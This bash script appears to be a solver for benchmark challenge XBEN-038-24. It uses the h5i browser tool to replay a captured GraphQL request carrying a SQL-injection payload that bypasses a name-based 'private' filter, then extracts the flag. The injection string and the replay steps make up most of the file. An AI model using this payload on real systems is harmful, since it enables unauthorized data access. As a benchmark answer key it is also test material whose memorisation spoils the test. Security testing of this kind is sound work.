#!/usr/bin/env bash
# XBEN-038-24 — "Simple GraphQL" (tags: graphql, sqli)
#
# The GraphQL resolver refuses `private` by name and then interpolates whatever
# it was given into SQL. The refusal is a string comparison; the injection walks
# around it.
#
# The page sends its query as an inline document rather than as variables, so
# the payload replaces the whole `query` field. That is why the request is taken
# from the page instead of composed: the operation, the selection set and the
# content type are all already right, and only the string inside changes.
set -uo pipefail
URL="${1:?usage: $0 http://127.0.0.1:PORT}"
H5I="${H5I:-h5i}"
SESSION="xben038-$$"
trap '"$H5I" browser close --session "$SESSION" >/dev/null 2>&1' EXIT

"$H5I" browser open "$URL/" --session "$SESSION" --new --capture --script >/dev/null
SEQ="$("$H5I" browser click --role button --name "Filter Jobs" --session "$SESSION" --json |
    python3 -c 'import json,sys; print(json.load(sys.stdin)["caused_requests"][0]["seq"])')"

QUERY='query { jobs(jobType: "x'"'"' OR type='"'"'private") { id name type description } }'
REPLAY="$("$H5I" websec replay "req_$SEQ" --set "json.query=$QUERY" --session "$SESSION" |
    python3 -c 'import json,sys; print(json.load(sys.stdin)["seq"])')"

"$H5I" websec match "res_$REPLAY" --regex 'FLAG\{[a-f0-9]{64}\}' --session "$SESSION" |
    python3 -c 'import json,sys; d=json.load(sys.stdin); print(d["conditions"][0]["captures"][0] if d["matched"] else "no flag found")'
